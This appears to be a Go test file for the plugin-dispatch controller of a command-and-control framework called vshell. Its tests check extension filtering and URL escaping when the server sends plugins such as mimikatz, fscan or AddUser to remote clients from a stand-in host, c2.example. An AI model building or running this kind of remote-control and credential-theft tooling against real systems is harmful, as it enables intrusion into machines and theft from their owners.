package controllers

import (
	"os"
	"strings"
	"testing"

	"vshell/c2engine"
)

// TestDispatchPluginExtensionValidation verifies the original binary's
// extension gate: only elf/so/dylib plugins are accepted
// (black-box: mimikatz.x64.exe → "support elf,so,dylib extension").
func TestDispatchPluginExtensionValidation(t *testing.T) {
	for _, name := range []string{"mimikatz.x64.exe", "AddUser.dll", "tool.bin", "noext"} {
		_, err := DispatchPluginToClient(1, name, nil, 120, "http", "127.0.0.1:8082")
		if err == nil {
			t.Errorf("plugin %q should be rejected (client 1 missing anyway)", name)
			continue
		}
		if !strings.Contains(err.Error(), "support elf,so,dylib extension") {
			t.Errorf("plugin %q error = %q, want extension message", name, err.Error())
		}
	}

	// elf/so/dylib pass the extension gate (then fail at client lookup)
	_, err := DispatchPluginToClient(1, "fscan.x64.elf", nil, 120, "http", "127.0.0.1:8082")
	if err == nil {
		t.Error("elf plugin should fail at client lookup (client 1 missing)")
	} else if strings.Contains(err.Error(), "support elf,so,dylib") {
		t.Errorf("elf plugin should NOT hit extension error: %v", err)
	}
}

// TestDispatchPluginURLIsEscapedAndSchemeAware verifies the download URL is
// query-escaped and uses the given scheme (regression: name was spliced raw and
// the scheme was hardcoded to http).
func TestDispatchPluginURLIsEscapedAndSchemeAware(t *testing.T) {
	engine := c2engine.GetEngine()
	if err := engine.Init(&c2engine.Config{DBPath: t.TempDir() + "/engine.json"}); err != nil {
		t.Fatalf("engine.Init: %v", err)
	}
	if _, err := engine.NewClient("plugin-url-vkey", "http", "10.0.0.8:8000",
		"10.0.0.8", "u", "h", "linux", "a"); err != nil {
		t.Fatalf("NewClient: %v", err)
	}

	// A plugin with a space/& in the name (valid filename) must produce a
	// well-formed, escaped download URL.
	path := t.TempDir() + "/sp ace&x.elf"
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatalf("write plugin: %v", err)
	}

	res, err := DispatchPluginToClient(1, path, []string{"-h"}, 120, "https", "c2.example:8443")
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	// The URL must be https and the name percent-encoded.
	if !strings.HasPrefix(res.DownloadURL, "https://c2.example:8443/api/plugin/download?name=") {
		t.Fatalf("url = %q, want https scheme + base", res.DownloadURL)
	}
	if strings.Contains(res.DownloadURL, "sp ace") || strings.Contains(res.DownloadURL, "&x.elf") {
		t.Fatalf("plugin name not escaped in url: %q", res.DownloadURL)
	}
	// url.QueryEscape encodes a space as '+' (valid form encoding); the server
	// decodes it back to a space via r.URL.Query().Get("name").
	if !strings.Contains(res.DownloadURL, "sp+ace") && !strings.Contains(res.DownloadURL, "sp%20ace") {
		t.Fatalf("space not escaped: %q", res.DownloadURL)
	}
	if !strings.Contains(res.DownloadURL, "%26") {
		t.Fatalf("& not escaped: %q", res.DownloadURL)
	}
}
